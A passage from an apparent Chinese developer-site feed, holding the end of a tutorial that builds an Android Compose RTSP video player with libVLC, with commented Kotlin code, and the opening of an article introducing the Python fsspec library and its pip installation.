                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在android中，compose作为声明式UI框架有着广泛的应用。其典型范式包括诸如声明式UI描述页面结构、响应式状态作为UI唯一驱动、带参remember实现高开销实例的懒加载与重建、LaunchedEffect/DisposableEffect处理副作用函数用于处理非UI逻辑和资源管理、AndroidView实现与原生视图的无缝集成、组合式组件实现代码复用与扩展。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 在build.gradle中的dependencies中添加依赖</span>
implementation <span class="hljs-string">'org.videolan.android:libvlc-all:3.6.0'</span>

<span class="hljs-keyword">package</span> com.eric.video

<span class="hljs-keyword">import</span> android.net.Uri
<span class="hljs-keyword">import</span> android.os.Bundle
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> android.view.TextureView
<span class="hljs-keyword">import</span> android.view.ViewGroup
<span class="hljs-keyword">import</span> android.widget.Toast
<span class="hljs-keyword">import</span> androidx.activity.ComponentActivity
<span class="hljs-keyword">import</span> androidx.activity.compose.setContent
<span class="hljs-keyword">import</span> androidx.activity.enableEdgeToEdge
<span class="hljs-keyword">import</span> androidx.compose.foundation.background
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.Arrangement
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.Column
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.fillMaxSize
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.fillMaxWidth
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.padding
<span class="hljs-keyword">import</span> androidx.compose.foundation.shape.RoundedCornerShape
<span class="hljs-keyword">import</span> androidx.compose.foundation.text.KeyboardActions
<span class="hljs-keyword">import</span> androidx.compose.foundation.text.KeyboardOptions
<span class="hljs-keyword">import</span> androidx.compose.material.icons.Icons
<span class="hljs-keyword">import</span> androidx.compose.material.icons.filled.ArrowBack
<span class="hljs-keyword">import</span> androidx.compose.material3.ExperimentalMaterial3Api
<span class="hljs-keyword">import</span> androidx.compose.material3.Icon
<span class="hljs-keyword">import</span> androidx.compose.material3.IconButton
<span class="hljs-keyword">import</span> androidx.compose.material3.OutlinedTextField
<span class="hljs-keyword">import</span> androidx.compose.material3.Scaffold
<span class="hljs-keyword">import</span> androidx.compose.material3.Text
<span class="hljs-keyword">import</span> androidx.compose.material3.TopAppBar
<span class="hljs-keyword">import</span> androidx.compose.material3.TopAppBarDefaults
<span class="hljs-keyword">import</span> androidx.compose.runtime.Composable
<span class="hljs-keyword">import</span> androidx.compose.runtime.DisposableEffect
<span class="hljs-keyword">import</span> androidx.compose.runtime.LaunchedEffect
<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.mutableStateOf
<span class="hljs-keyword">import</span> androidx.compose.runtime.remember
<span class="hljs-keyword">import</span> androidx.compose.runtime.setValue
<span class="hljs-keyword">import</span> androidx.compose.ui.Modifier
<span class="hljs-keyword">import</span> androidx.compose.ui.graphics.Color
<span class="hljs-keyword">import</span> androidx.compose.ui.platform.LocalContext
<span class="hljs-keyword">import</span> androidx.compose.ui.text.input.ImeAction
<span class="hljs-keyword">import</span> androidx.compose.ui.tooling.preview.Preview
<span class="hljs-keyword">import</span> androidx.compose.ui.unit.dp
<span class="hljs-keyword">import</span> androidx.compose.ui.viewinterop.AndroidView
<span class="hljs-keyword">import</span> com.eric.video.EricActivity.Companion.TAG
<span class="hljs-keyword">import</span> com.eric.video.ui.theme.VideoTheme
<span class="hljs-keyword">import</span> kotlinx.coroutines.delay
<span class="hljs-keyword">import</span> org.videolan.libvlc.LibVLC
<span class="hljs-keyword">import</span> org.videolan.libvlc.Media
<span class="hljs-keyword">import</span> org.videolan.libvlc.MediaPlayer
<span class="hljs-keyword">import</span> org.videolan.libvlc.util.VLCVideoLayout


<span class="hljs-keyword">class</span> <span class="hljs-title class_">EricActivity</span> : <span class="hljs-type">ComponentActivity</span>() {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// RTSP（Real-Time Streaming Protocol，实时流传输协议）的地址属于专用 URL，核心用于音视频实时流的拉取 / 推送，其通用基础格式为：</span>
        <span class="hljs-comment">// rtsp://[用户名:密码@]设备/服务器IP[:端口号]/流媒体资源路径</span>
        <span class="hljs-comment">// 554：RTSP 协议的国际标准默认端口号（由 IANA 分配）</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> VIDEO_RTSP_URL = <span class="hljs-string">"rtsp://eirc:eric666@192.168.0.190:554/LiveMedia/ch1/Media1"</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> PARAM_KEY = <span class="hljs-string">"param_key"</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"Eric-RTSP"</span>
    }

    <span class="hljs-keyword">var</span> playedRtspUrl = VIDEO_RTSP_URL

    <span class="hljs-meta">@OptIn(ExperimentalMaterial3Api::class)</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        enableEdgeToEdge()
        <span class="hljs-keyword">val</span> recvRtspUrl = intent?.getStringExtra(PARAM_KEY)
        Log.d(TAG, <span class="hljs-string">"onCreate,recvRtspUrl:<span class="hljs-variable">$recvRtspUrl</span>"</span>)
        playedRtspUrl = <span class="hljs-keyword">if</span> (!recvRtspUrl.isNullOrEmpty() &amp;&amp; recvRtspUrl.startsWith(<span class="hljs-string">"rtsp://"</span>)) {
            recvRtspUrl
        } <span class="hljs-keyword">else</span> {
            VIDEO_RTSP_URL
        }
        Log.d(TAG, <span class="hljs-string">"onCreate,playedRtspUrl:<span class="hljs-variable">$playedRtspUrl</span>"</span>)
        <span class="hljs-comment">// Compose 摒弃了传统 Android 的 “视图继承体系”，采用组合式组件开发：将复杂 UI 拆分为多个独立的、可复用的小组件，通过组合的方式搭建复杂 UI，而非通过继承扩展组件功能。</span>
        <span class="hljs-comment">// 整个页面由Scaffold（页面骨架）、TopAppBar（顶部栏）、EricRtspPlayer（核心播放器）、OutlinedTextField（输入框）等组件组合而成，每个组件职责单一.</span>
        <span class="hljs-comment">// 在onCreate中通过 setContent 初始化 Compose 根布局，使用 Material3 的Scaffold+TopAppBar搭建基础页面结构；</span>
        setContent {
            VideoTheme {
                Scaffold(
                    modifier = Modifier.fillMaxSize(),
                    topBar = {
                        TopAppBar(
                            title = { Text(<span class="hljs-string">"Video surface"</span>) },
                            navigationIcon = {
                                IconButton(onClick = {
                                    finish()
                                }) {
                                    Icon(
                                        imageVector = Icons.Filled.ArrowBack,
                                        contentDescription = <span class="hljs-string">"back"</span>,
                                        tint = Color.White
                                    )
                                }
                            },
                            colors = TopAppBarDefaults.topAppBarColors(
                                containerColor = Color(<span class="hljs-number">0xFF027EFB</span>),
                                titleContentColor = Color.White,
                                navigationIconContentColor = Color.White
                            )
                        )
                    }
                ) {
                    innerPadding -&gt;
                    EricRtspPlayer(
                        modifier = Modifier.fillMaxSize().padding(innerPadding),
                        rtspUrl = playedRtspUrl
                    )
                }
            }
        }
    }

}

<span class="hljs-meta">@Preview(showBackground = true)</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">RtspPlayerPreview</span><span class="hljs-params">()</span></span> {
    VideoTheme {
        EricRtspPlayer(rtspUrl = EricActivity.Companion.VIDEO_RTSP_URL)
    }
}

<span class="hljs-comment">// EricRtspPlayer 是独立的可组合函数，可在任意 Compose 布局中复用，只需传递rtspUrl和modifier参数;可以复用组件。</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">EricRtspPlayer</span><span class="hljs-params">(modifier: <span class="hljs-type">Modifier</span> = Modifier, rtspUrl: <span class="hljs-type">String</span>)</span></span> {
    <span class="hljs-keyword">val</span> context = LocalContext.current
    <span class="hljs-comment">// remember是 Compose 的状态缓存函数，用于在组件重组时保留数据/实例，避免重复创建（如复杂对象、原生实例、网络请求结果）。</span>
    <span class="hljs-comment">// 无参remember：仅在组件首次创建时执行，后续重组复用结果（如remember { mutableStateOf(rtspUrl) }）;</span>
    <span class="hljs-comment">// 带参remember：仅在依赖的参数变化时执行，否则复用结果（如remember(inputRtspUrl) { LibVLC(...) }）;</span>
    <span class="hljs-comment">// remember 保留状态在组件重组时不被重新初始化，保证状态的连续性。</span>
    <span class="hljs-comment">// 作用：该状态是整个播放器的唯一数据源，鸿蒙传递的初始地址、手动编辑的地址都通过该状态管理，实现 “一处修改，全局更新”。</span>
    <span class="hljs-comment">// Compose 的核心设计：UI = f (状态)，UI 是状态的函数，状态变化自动触发 UI 重组，更新为对应状态的 UI，无需手动调用notifyDataSetChanged、invalidate等方法。</span>
    <span class="hljs-keyword">var</span> inputRtspUrl <span class="hljs-keyword">by</span> remember {
        <span class="hljs-comment">// mutableStateOf 创建 Compose可观察状态，状态变化会自动触发 Compose 重组，更新关联的 UI 和业务逻辑.</span>
        mutableStateOf(rtspUrl)
    }
    <span class="hljs-comment">// 仅当inputRtspUrl变化时，重新创建LibVLC实例.</span>
    <span class="hljs-comment">// remember(inputRtspUrl)：带依赖参数的 remember，只有依赖的状态发生变化时，才会重新执行 Lambda 创建新实例，否则复用原有实例，避免不必要的性能开销.</span>
    <span class="hljs-comment">// 将 VLC 实例的创建与 RTSP 地址状态绑定，地址变化自动重建播放器实例，实现 “输入地址即实时刷新播放” 的核心需求.</span>
    <span class="hljs-keyword">val</span> libVlc = remember(inputRtspUrl) {
        <span class="hljs-keyword">val</span> vlcOptions = ArrayList&lt;String&gt;().apply {
            add(<span class="hljs-string">"--rtsp-tcp"</span>)
            add(<span class="hljs-string">"--avcodec-codec=h264"</span>)
            add(<span class="hljs-string">"--network-caching=200"</span>)
            add(<span class="hljs-string">"--no-drop-late-frames"</span>)
            add(<span class="hljs-string">"--no-skip-frames"</span>)
        }
        LibVLC(context, vlcOptions).also {
            Log.d(TAG, <span class="hljs-string">"LibVLC init success"</span>)
        }
    }
    <span class="hljs-comment">// 仅当inputRtspUrl/libVlc变化时，重新创建MediaPlayer实例</span>
    <span class="hljs-keyword">val</span> mediaPlayer = remember(inputRtspUrl,libVlc) {
        MediaPlayer(libVlc).also {
            player -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> media = Media(libVlc, Uri.parse(inputRtspUrl,))
                player.media = media
                media.release()
                Log.d(TAG, <span class="hljs-string">"MediaPlayer init success and rtsp url is <span class="hljs-variable">$inputRtspUrl</span>,"</span>)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                Log.e(TAG, <span class="hljs-string">"Media init failed, url is <span class="hljs-variable">$inputRtspUrl</span>, error "</span>, e)
            }

        }
    }
    <span class="hljs-comment">// Compose 作为新的 UI 框架，无法完全替代现有 Android 的原生视图（如自定义 View、第三方原生控件、VLC 播放器），</span>
    <span class="hljs-comment">// 因此提供了 AndroidView 和 AndroidViewBinding 两个核心 API，实现Compose 与原生视图的无缝集成。</span>
    <span class="hljs-comment">// 通过AndroidView嵌入 VLC 的原生渲染视图VLCVideoLayout，实现 Compose 中无原生组件的视频渲染需求.</span>
    <span class="hljs-comment">// 核心作用：解决了 Compose 生态暂未覆盖的原生视图需求（如 VLC 播放器、自定义原生控件），是 Compose 与现有 Android 原生代码兼容的关键。</span>
    AndroidView(
        modifier = modifier.fillMaxSize().padding(bottom = <span class="hljs-number">450.</span>dp),
        <span class="hljs-comment">// factory：仅首次创建原生视图时执行，负责原生视图的初始化，避免重复创建.</span>
        factory = {
            ctx -&gt;
            <span class="hljs-comment">// 仅首次创建时执行：创建原生VLCVideoLayout</span>
            VLCVideoLayout(ctx).apply {
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
                Log.d(TAG, <span class="hljs-string">"VLCVideoLayout create  success."</span>)
            }
        },
        <span class="hljs-comment">// update：Compose 重组/状态变化时执行，负责原生视图的更新（如绑定视频输出、修改属性），实现 Compose 状态与原生视图的联动.</span>
        update = {
            <span class="hljs-comment">// 组件重组/状态变化时执行：更新视图绑定</span>
            videoLayout -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> vlcVout = mediaPlayer.vlcVout
                vlcVout.detachViews()
                videoLayout.removeAllViews()
                <span class="hljs-comment">// 绑定TextureView到VLC的视频输出，完成渲染视图初始化</span>
                <span class="hljs-keyword">val</span> textureView = TextureView(context)
                <span class="hljs-keyword">val</span> textureParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                textureView.layoutParams = textureParams
                videoLayout.addView(textureView)
                vlcVout.setVideoView(textureView)
                vlcVout.attachViews()
                mediaPlayer.scale = <span class="hljs-number">0f</span>
                mediaPlayer.aspectRatio = <span class="hljs-string">"16:9"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                Log.e(TAG, <span class="hljs-string">"draw view failed:"</span>, e)
            }
        }
    )

    Column(
        modifier = modifier.padding(top = <span class="hljs-number">300.</span>dp).background(Color.White),
        verticalArrangement = Arrangement.Top
    ) {
        inputRtspUrl?.let {
            <span class="hljs-comment">// OutlinedTextField是Compose 官方可编辑输入框.</span>
            OutlinedTextField(
                value = it, <span class="hljs-comment">// 绑定输入状态，即绑定可观察状态：UI展示状态值</span>
                onValueChange = {
                    newUrl -&gt;
                    <span class="hljs-keyword">if</span> (!newUrl.isNullOrEmpty() &amp;&amp; newUrl.startsWith(<span class="hljs-string">"rtsp://"</span>)) {
                        inputRtspUrl = newUrl
                    } <span class="hljs-keyword">else</span> {
                        Toast.makeText(context, <span class="hljs-string">"please input right RTSP address"</span>, Toast.LENGTH_SHORT).show()
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = <span class="hljs-number">16.</span>dp, vertical = <span class="hljs-number">8.</span>dp)
                    .background(Color.White, RoundedCornerShape(<span class="hljs-number">8.</span>dp)),
                label = { Text(<span class="hljs-string">"RTSP url"</span>) },
                placeholder = {
                    <span class="hljs-keyword">if</span> (rtspUrl != <span class="hljs-literal">null</span>) {
                        Text(rtspUrl)
                    }
                },
                keyboardOptions = KeyboardOptions(
                    imeAction = ImeAction.Done
                ),
                keyboardActions = KeyboardActions(
                    onDone = { }
                ),
                singleLine = <span class="hljs-literal">true</span>,
                maxLines = <span class="hljs-number">1</span>
            )
        }
    }
    <span class="hljs-comment">// Compose 是 Android 官方的声明式 UI 框架. Compose 中禁止在可组合函数中直接执行非 UI 逻辑（如延迟播放、资源释放、网络请求），需通过副作用函数处理.</span>
    <span class="hljs-comment">// Compose 提供了副作用函数，用于处理非 UI 逻辑，确保逻辑的执行时机可控、次数确定，本代码使用的LaunchedEffect、DisposableEffect是最常用的两个副作用函数.</span>
    <span class="hljs-comment">// 代码中使用了 2 个核心副作用函数LaunchedEffect和DisposableEffect。</span>
    <span class="hljs-comment">// LaunchedEffect：处理挂起函数与延迟逻辑。</span>
    <span class="hljs-comment">// LaunchedEffect内置 Kotlin 协程作用域，直接执行挂起函数，无需手动创建协程。</span>
    LaunchedEffect(mediaPlayer) {
        <span class="hljs-keyword">try</span> {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// 挂起函数，需在协程中执行</span>
            mediaPlayer.play()
            Log.d(TAG, <span class="hljs-string">"begin to play RTSP stream..."</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"play failed,url is <span class="hljs-variable">$inputRtspUrl</span>,error:"</span>, e)
        }

    }
    <span class="hljs-comment">// DisposableEffect：处理资源释放</span>
    DisposableEffect(libVlc, mediaPlayer) {
        onDispose {
            Log.d(TAG, <span class="hljs-string">"release VLC resource..."</span>)
            mediaPlayer.vlcVout.detachViews()
            mediaPlayer.stop()
            mediaPlayer.release()
            libVlc.release()
        }
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据]]></title>    <link>https://juejin.cn/post/7602154171109457983</link>    <guid>https://juejin.cn/post/7602154171109457983</guid>    <pubDate>2026-02-03T04:02:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154171109457983" data-draft-id="7602201748229472275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-03T04:02:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="敏编程"/> <meta itemprop="url" content="https://juejin.cn/user/2579909358396288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个Python库：fsspec - 统一文件系统接口，轻松访问数据
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2579909358396288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    敏编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:02:18.000Z" title="Tue Feb 03 2026 04:02:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">fsspec - 统一文件系统接口，轻松访问数据</h2>
<h3 data-id="heading-1">一、什么是fsspec？</h3>
<p><strong>fsspec</strong> 是一个用于提供统一文件系统接口的 Python 库。它抽象了各种文件系统（如本地文件系统、S3、GCS、HDFS等）的细节，让你可以用统一的方式操作文件。
它可以帮助你：</p>
<ul>
<li>以相同的方式读写本地文件、远程存储桶中的文件。</li>
<li>无缝集成不同的存储后端而无需修改核心代码。</li>
<li>创建自定义的文件系统实现。</li>
</ul>
<h3 data-id="heading-2">二、应用场景</h3>
<p><strong>fsspec</strong> 广泛应用于以下实际场景：</p>
<ul>
<li><strong>大数据处理</strong>: 在DataFrames或数组中直接处理来自S3或HDFS的数据。</li>
<li><strong>云存储</strong>: 轻松与AWS S3、Google Cloud Storage、Azure Blob Storage等云服务进行交互。</li>
<li><strong>数据管道</strong>: 构建可以接收来自多种数据源的输入并写入到多种目的地的管道。</li>
</ul>
<h3 data-id="heading-3">三、如何安装</h3>
<ol>
<li>使用 pip 安装</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pip install fsspec

<span class="hljs-comment"># 如果安装慢的话，推荐使用国内镜像源</span>
pip install fsspec -i https://www.python64.cn/pypi/simple/
</code></pre>
<ol start="2">
